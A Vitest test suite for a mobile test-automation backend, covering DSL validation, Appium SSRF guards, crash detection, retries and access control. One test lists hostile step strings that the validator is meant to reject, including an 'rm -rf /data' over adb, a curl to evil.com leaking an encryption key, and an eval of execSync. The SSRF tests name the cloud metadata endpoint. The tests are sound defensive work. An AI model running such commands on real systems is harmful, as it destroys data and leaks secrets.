import { describe, it, expect, vi, beforeAll, afterAll } from "vitest";
import Fastify, { type FastifyInstance } from "fastify";
import cookie from "@fastify/cookie";
import cors from "@fastify/cors";
import { pool } from "../config/db";
import { env } from "../config/env";
import mobileRoutes from "../routes/mobile";
import { createAuthHook } from "../services/auth";
import {
  validateMobileDsl,
  parseSelector,
  validateAppPackage,
} from "../services/mobile/mobileDsl";
import { AppiumClient, MobileDriverError } from "../services/mobile/appiumClient";
import { XCUITestDriver } from "../services/mobile/iosDriver";
import {
  detectCrashFromLogs,
  isMobileElementNotVisible,
  runMobileTestCase,
} from "../services/mobileRunner";
import { parseAdbDevices } from "../services/mobile/deviceRegistry";
import { runMobileTestWithRetries } from "../services/executionManager";
import { enqueueJob, registerJobHandler } from "../services/jobs/jobQueue";
import { initializeJobHandlers } from "../services/jobs/jobHandlers";
import {
  classifyTestType,
  generateFallbackAutomation,
  testCaseAutomationSchema,
} from "../services/automationConverter";
import { createSessionForUser, type PlatformRole } from "../services/authService";
import { hashPassword } from "../services/passwordService";

describe("TASK 15: Android Mobile App Testing Integration", () => {
  let app: FastifyInstance;
  let testProjectId: string;
  let adminUserId: string;
  let engineerUserId: string;
  let viewerUserId: string;
  let adminToken: string;
  let engineerToken: string;
  let viewerToken: string;

  async function createTestUser(opts: { role: PlatformRole }): Promise<{ id: string; email: string }> {
    const id = (await import("node:crypto")).randomUUID();
    const email = `test-${id.slice(0, 8)}@example.com`;
    const pwdHash = await hashPassword("StrongPassword123!");
    await pool.query(
      `INSERT INTO users (id, email, password_hash, full_name, role, is_active)
       VALUES ($1, $2, $3, $4, $5, TRUE)`,
      [id, email, pwdHash, `User ${id.slice(0, 4)}`, opts.role],
    );
    return { id, email };
  }

  async function createTestSession(userId: string): Promise<string> {
    const session = await createSessionForUser(userId);
    return session.sessionToken;
  }

  beforeAll(async () => {
    initializeJobHandlers();

    app = Fastify({ logger: false });
    await app.register(cookie, { secret: env.COOKIE_SECRET });
    await app.register(cors, { origin: true, credentials: true });
    app.addHook("onRequest", createAuthHook(env.PLATFORM_API_KEY));
    await app.register(mobileRoutes);
    await app.ready();

    // Create test project
    const projRes = await pool.query(
      `INSERT INTO projects (id, name, base_url, owner_confirmed)
       VALUES (gen_random_uuid(), 'Mobile Test Suite Project', 'http://127.0.0.1:4723', true)
       RETURNING id`,
    );
    testProjectId = projRes.rows[0].id;

    // Create test users and sessions
    const adminUser = await createTestUser({ role: "admin" });
    adminUserId = adminUser.id;
    adminToken = await createTestSession(adminUserId);

    const engineerUser = await createTestUser({ role: "qa_engineer" });
    engineerUserId = engineerUser.id;
    engineerToken = await createTestSession(engineerUserId);

    const viewerUser = await createTestUser({ role: "viewer" });
    viewerUserId = viewerUser.id;
    viewerToken = await createTestSession(viewerUserId);

    await pool.query(
      `INSERT INTO project_members (project_id, user_id, role)
       VALUES ($1, $2, 'qa_engineer'), ($1, $3, 'viewer')`,
      [testProjectId, engineerUserId, viewerUserId],
    );
  });

  afterAll(async () => {
    await app.close();
    await pool.query("DELETE FROM projects WHERE id = $1", [testProjectId]);
    await pool.query("DELETE FROM users WHERE id IN ($1, $2, $3)", [
      adminUserId,
      engineerUserId,
      viewerUserId,
    ]);
  });

  // 1. Restricted Mobile DSL Validation & Security
  describe("1. Secure Mobile Test DSL & Injection Prevention", () => {
    it("validates safe mobile DSL steps correctly", () => {
      const validSteps = [
        "app launch com.android.settings",
        "tap text:Network & internet",
        "type id:com.android.settings:id/search_src_text | Wi-Fi",
        "clear id:com.android.settings:id/search_src_text",
        "scroll down",
        "swipe 500 1500 500 500 400",
        "expect visible text:Wi-Fi",
        "expect not visible text:NonExistentElement",
        "expect text id:android:id/title | Connected",
        "expect text Connected",
        "wait 1000",
        "press back",
        "background 5",
        "screenshot",
        "app close com.android.settings",
      ];

      const res = validateMobileDsl(validSteps);
      expect(res.valid).toBe(true);
      expect(res.errors).toHaveLength(0);
      expect(res.parsedSteps).toHaveLength(validSteps.length);
    });

    it("rejects arbitrary JavaScript, eval, and shell commands in steps", () => {
      const maliciousSteps = [
        "eval('require(\"child_process\").execSync(\"whoami\")')",
        "tap id:button; adb shell rm -rf /data",
        "type input | `curl http://evil.com/leak?data=${process.env.ENCRYPTION_KEY}`",
        "app launch com.test && powershell -c calc",
        "type input | <script>alert(1)</script>",
      ];

      for (const badStep of maliciousSteps) {
        const res = validateMobileDsl([badStep]);
        expect(res.valid).toBe(false);
        expect(res.errors.length).toBeGreaterThan(0);
        expect(res.errors[0]).toMatch(/Security violation|forbidden|Unknown or forbidden/i);
      }
    });

    it("enforces parameter bounds on wait, background, and coordinates", () => {
      const invalidWait = validateMobileDsl(["wait 99999999"]);
      expect(invalidWait.valid).toBe(false);
      expect(invalidWait.errors[0]).toContain("between 0 and 30000");

      const invalidBg = validateMobileDsl(["background 120"]);
      expect(invalidBg.valid).toBe(false);
      expect(invalidBg.errors[0]).toContain("between 1 and 60");

      const invalidSwipe = validateMobileDsl(["swipe foo bar baz"]);
      expect(invalidSwipe.valid).toBe(false);
      expect(invalidSwipe.errors[0]).toContain("requires 4 coordinates");
    });

    it("validates and parses mobile selector strategies accurately", () => {
      expect(parseSelector("id:com.example:id/submit_btn")).toEqual({
        using: "id",
        value: "com.example:id/submit_btn",
      });

      expect(parseSelector("accessibility id:SearchButton")).toEqual({
        using: "accessibility id",
        value: "SearchButton",
      });

      expect(parseSelector("~MenuToggle")).toEqual({
        using: "accessibility id",
        value: "MenuToggle",
      });

      expect(parseSelector("text:Save Changes")).toEqual({
        using: "-android uiautomator",
        value: 'new UiSelector().textContains("Save Changes")',
      });

      expect(parseSelector("//android.widget.Button[@text='OK']")).toEqual({
        using: "xpath",
        value: "//android.widget.Button[@text='OK']",
      });
    });

    it("validates Android package naming rules", () => {
      expect(validateAppPackage("com.android.settings")).toBe(true);
      expect(validateAppPackage("org.chromium.chrome")).toBe(true);
      expect(validateAppPackage("invalid-package")).toBe(false);
      expect(validateAppPackage("123.com.test")).toBe(false);
    });
  });

  // 2. Appium URL Security & Anti-SSRF
  describe("2. Appium Client Security & URL Guard", () => {
    it("allows loopback Appium host (127.0.0.1, localhost)", () => {
      expect(() => new AppiumClient("http://127.0.0.1:4723")).not.toThrow();
      expect(() => new AppiumClient("http://localhost:4723")).not.toThrow();
    });

    it("strictly blocks external URLs and cloud metadata endpoints from Appium client", () => {
      expect(() => new AppiumClient("http://169.254.169.254/latest/meta-data")).toThrow(
        /forbidden for security/i,
      );
      expect(() => new AppiumClient("http://attacker-controlled-host.com:4723")).toThrow(
        /forbidden for security/i,
      );
      expect(() => new AppiumClient("http://10.0.0.1:4723")).toThrow(
        /forbidden for security/i,
      );
    });

    it("accepts IPv6 loopback and rejects credentials in Appium URLs", () => {
      expect(() => new AppiumClient("http://[::1]:4723")).not.toThrow();
      expect(() => new AppiumClient("http://user:pass@127.0.0.1:4723")).toThrow(
        /must not contain credentials/i,
      );
    });
  });

  // 3. iOS Architecture Preparation
  describe("3. iOS Driver Architecture Preparation", () => {
    it("provides XCUITest interface and throws descriptive macOS requirement notice", async () => {
      const iosDriver = new XCUITestDriver();
      expect(iosDriver.platform).toBe("ios");
      expect(iosDriver.isConnected).toBe(false);

      await expect(
        iosDriver.createSession({
          platformName: "iOS",
          "appium:automationName": "XCUITest",
          "appium:deviceName": "iPhone 16",
          "appium:udid": "auto",
        }),
      ).rejects.toThrow(/iOS test execution is not supported on Windows\/Linux environments/i);
    });
  });

  // 4. Crash Detection
  describe("4. Android Crash & Logcat Analysis", () => {
    it("detects Fatal Exceptions and extracts crash stack traces from logs", () => {
      const sampleLogs = [
        "11-04 12:00:01.123 1234 1234 D AndroidRuntime: >>>>>> START com.android.internal.os.RuntimeInit <<<<<<",
        "11-04 12:00:02.456 1234 1234 E AndroidRuntime: FATAL EXCEPTION: main",
        "11-04 12:00:02.456 1234 1234 E AndroidRuntime: Process: com.example.app, PID: 1234",
        "11-04 12:00:02.457 1234 1234 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke virtual method",
        "11-04 12:00:02.458 1234 1234 E AndroidRuntime: \tat com.example.app.MainActivity.onCreate(MainActivity.java:42)",
      ];

      const crash = detectCrashFromLogs(sampleLogs);
      expect(crash.crashed).toBe(true);
      expect(crash.exceptionType).toBe("FATAL EXCEPTION");
      expect(crash.logSnippet).toContain("NullPointerException");
    });

    it("returns crashed=false for normal logs without exceptions", () => {
      const normalLogs = [
        "11-04 12:00:01.000 I ViewRootImpl: ViewPostIme key 0",
        "11-04 12:00:02.000 D SettingsActivity: Resuming Settings",
      ];
      expect(detectCrashFromLogs(normalLogs).crashed).toBe(false);
    });

    it("parses actual ADB devices and reports each connection state", () => {
      const devices = parseAdbDevices(
        "List of devices attached\r\nemulator-5554 device product:sdk_gphone64_x86_64 model:Pixel_7\r\nR58N123 unauthorized usb:1-1\r\n",
      );
      expect(devices).toEqual([
        {
          udid: "emulator-5554",
          state: "device",
          isEmulator: true,
          model: "Pixel 7",
        },
        {
          udid: "R58N123",
          state: "unauthorized",
          isEmulator: false,
        },
      ]);
    });

    it("does not suppress assertion failures or Appium lookup errors for expect-not-visible", async () => {
      const locator = { using: "id" as const, value: "login_button" };
      await expect(
        isMobileElementNotVisible({
          findElements: async () => ["element-1"],
          isDisplayed: async () => true,
        }, locator),
      ).resolves.toBe(false);
      await expect(
        isMobileElementNotVisible({
          findElements: async () => [],
          isDisplayed: async () => false,
        }, locator),
      ).resolves.toBe(true);
      await expect(
        isMobileElementNotVisible({
          findElements: async () => ["element-1"],
          isDisplayed: async () => { throw new Error("Appium transport failed"); },
        }, locator),
      ).rejects.toThrow("Appium transport failed");
    });

    it("reports missing Android device configuration instead of selecting a fake emulator", async () => {
      const result = await runMobileTestCase(
        ["wait 1"],
        { runId: "no-device-run", resultId: "no-device-result" },
      );
      expect(result.status).toBe("inconclusive");
      expect(result.errorMessage).toContain("No Android device UDID");
      expect(result.deviceInfo.udid).toBe("");
    });
  });

  // 5. Retries and Flaky Detection
  describe("5. Retries & Flaky Detection for Mobile Execution", () => {
    it("flags test as flaky when it fails on attempt 1 and passes on attempt 2", async () => {
      let callCount = 0;
      const mockRunner = vi.fn().mockImplementation(async () => {
        callCount++;
        if (callCount === 1) {
          return {
            status: "failed",
            errorMessage: "Element not visible yet (transient rendering delay)",
            durationMs: 300,
            screenshotPath: null,
            deviceInfo: { platform: "android", deviceName: "emulator-5554", osVersion: "17", udid: "emulator-5554" },
            evidence: {
              status: "failed",
              durationMs: 300,
              failureStep: "expect visible text:Settings",
              failureStepIndex: 1,
              errorMessage: "Element not visible yet",
              screenshotPath: null,
              deviceLogs: [],
              crashEvidence: { crashed: false },
              stepResults: [],
              deviceInfo: { platform: "android", deviceName: "emulator-5554", osVersion: "17", udid: "emulator-5554" },
            },
            stepResults: [],
          };
        }
        return {
          status: "passed",
          errorMessage: undefined,
          durationMs: 200,
          screenshotPath: "artifacts/runs/test/shot.png",
          deviceInfo: { platform: "android", deviceName: "emulator-5554", osVersion: "17", udid: "emulator-5554" },
          evidence: {
            status: "passed",
            durationMs: 200,
            failureStep: null,
            failureStepIndex: null,
            errorMessage: null,
            screenshotPath: "artifacts/runs/test/shot.png",
            deviceLogs: [],
            crashEvidence: { crashed: false },
            stepResults: [],
            deviceInfo: { platform: "android", deviceName: "emulator-5554", osVersion: "17", udid: "emulator-5554" },
          },
          stepResults: [],
        };
      });

      const res = await runMobileTestWithRetries(
        ["app launch com.android.settings", "expect visible text:Settings"],
        { runId: "mock-run-id", resultId: "mock-result-id" },
        { retries: 2, backoffMs: 5, runner: mockRunner as any },
      );

      expect(res.status).toBe("passed");
      expect(res.flaky).toBe(true);
      expect(res.retryCount).toBe(1);
      expect(res.attempts).toHaveLength(2);
      expect(res.attempts[0].status).toBe("failed");
      expect(res.attempts[1].status).toBe("passed");
    });
  });

  // 6. Automation Classification and Fallback Generator
  describe("6. AI Mobile Automation Conversion & Classification", () => {
    it("heuristically classifies mobile user scenarios as 'mobile'", () => {
      const mobileCase = {
        title: "Verify Android Settings Wi-Fi screen opens on tap",
        description: "Mobile app test on Pixel emulator",
        steps: ["Launch Android settings app", "Tap on Network and internet", "Swipe down"],
        expected_result: "Wi-Fi toggle should be visible on touchscreen",
      };

      const classified = classifyTestType(mobileCase);
      expect(classified).toBe("mobile");
    });

    it("generates safe fallback Mobile DSL instructions", () => {
      const mobileCase = {
        title: "Test Login Screen Mobile",
        steps: ["Tap on Sign In", "Enter username and password", "Scroll down"],
        expected_result: "Welcome back screen is visible",
      };

      const fallback = generateFallbackAutomation(mobileCase, "mobile");
      expect(fallback.target_type).toBe("mobile");
      expect(fallback).toHaveProperty("mobile_steps");
      if (fallback.target_type === "mobile") {
        expect(fallback.mobile_steps[0]).toContain("app launch");
        expect(fallback.platform).toBe("android");
      }

      // Ensure fallback passes schema
      const parseResult = testCaseAutomationSchema.safeParse(fallback);
      expect(parseResult.success).toBe(true);
    });
  });

  // 7. Background Job Queue Integration
  describe("7. Background Job Queue Mobile Execution", () => {
    it("enqueues mobile execution job into PostgreSQL queue", async () => {
      const job = await enqueueJob({
        projectId: testProjectId,
        queueName: "mobile_tests",
        jobType: "mobile_execution",
        payload: {
          runId: "11111111-2222-3333-4444-555555555555",
          projectId: testProjectId,
          appPackage: "com.android.settings",
          deviceUdid: "emulator-5554",
          retries: 1,
        },
        createdBy: engineerUserId,
      });

      expect(job.id).toBeDefined();
      expect(job.jobType).toBe("mobile_execution");
      expect(job.status).toBe("pending");
      expect(job.queueName).toBe("mobile_tests");

      // Verify stored in PostgreSQL
      const dbJob = await pool.query("SELECT * FROM background_jobs WHERE id = $1", [job.id]);
      expect(dbJob.rowCount).toBe(1);
      expect(dbJob.rows[0].job_type).toBe("mobile_execution");
    });
  });

  // 8. Mobile HTTP API & Project-Level RBAC
  describe("8. Mobile HTTP API & RBAC Protection", () => {
    it("allows viewers to inspect Appium and device status", async () => {
      const res = await app.inject({
        method: "GET",
        url: `/projects/${testProjectId}/mobile/status`,
        headers: {
          authorization: `Bearer ${viewerToken}`,
        },
      });

      expect(res.statusCode).toBe(200);
      const body = res.json();
      expect(body).toHaveProperty("appium");
      expect(body).toHaveProperty("android");
      expect(body).toHaveProperty("ios");
      expect(body.appium.driver).toBe("UiAutomator2");
      expect(body.appium).toHaveProperty("ready");
      expect(body.android.devices).toBeInstanceOf(Array);
      expect(body.ios.available).toBe(false);
    });

    it("allows viewers to validate mobile DSL steps without executing", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/validate`,
        headers: {
          authorization: `Bearer ${viewerToken}`,
          "content-type": "application/json",
        },
        payload: {
          steps: ["app launch com.android.settings", "tap text:Display", "expect visible text:Display"],
        },
      });

      expect(res.statusCode).toBe(200);
      const body = res.json();
      expect(body.valid).toBe(true);
      expect(body.parsedSteps).toHaveLength(3);
    });

    it("rejects viewers from triggering mobile test runs (requires qa_engineer or admin)", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/runs`,
        headers: {
          authorization: `Bearer ${viewerToken}`,
          "content-type": "application/json",
        },
        payload: {
          async: true,
          app_package: "com.android.settings",
        },
      });

      // Must be forbidden for viewer
      expect(res.statusCode).toBe(403);
    });

    it("allows qa_engineer to enqueue async mobile test run", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/runs`,
        headers: {
          authorization: `Bearer ${engineerToken}`,
          "content-type": "application/json",
        },
        payload: {
          async: true,
          app_package: "com.android.settings",
        },
      });

      expect(res.statusCode).toBe(202);
      const body = res.json();
      expect(body.status).toBe("queued");
      expect(body.runId).toBeDefined();
      expect(body.jobId).toBeDefined();
    });

    it("rejects a synchronous run for a device that is not registered to the project", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/runs`,
        headers: {
          authorization: `Bearer ${engineerToken}`,
          "content-type": "application/json",
        },
        payload: { device_udid: "unregistered-android-device" },
      });

      expect(res.statusCode).toBe(400);
      expect(res.json().error).toMatch(/not registered as an active device/i);
    });

    it("rejects viewers and qa_engineers from registering new mobile devices (requires qa_manager or admin)", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/devices`,
        headers: {
          authorization: `Bearer ${engineerToken}`,
          "content-type": "application/json",
        },
        payload: {
          name: "Test Android Device",
          udid: "emulator-5556",
          platform: "android",
        },
      });

      expect(res.statusCode).toBe(403);
    });

    it("allows admin to register new mobile device for the project", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/devices`,
        headers: {
          authorization: `Bearer ${adminToken}`,
          "content-type": "application/json",
        },
        payload: {
          name: "Pixel 7 Production Emulator",
          udid: "emulator-5554",
          platform: "android",
          os_version: "Android 17",
          appium_url: "http://127.0.0.1:4723",
        },
      });

      expect(res.statusCode).toBe(201);
      const body = res.json();
      expect(body.name).toBe("Pixel 7 Production Emulator");
      expect(body.udid).toBe("emulator-5554");
    });

    it("rejects non-loopback Appium URLs during device registration", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/devices`,
        headers: {
          authorization: `Bearer ${adminToken}`,
          "content-type": "application/json",
        },
        payload: {
          name: "Remote Android Device",
          udid: "remote-device",
          platform: "android",
          appium_url: "http://169.254.169.254:4723",
        },
      });

      expect(res.statusCode).toBe(400);
      expect(res.json().error).toMatch(/loopback interface/i);
    });
  });
});
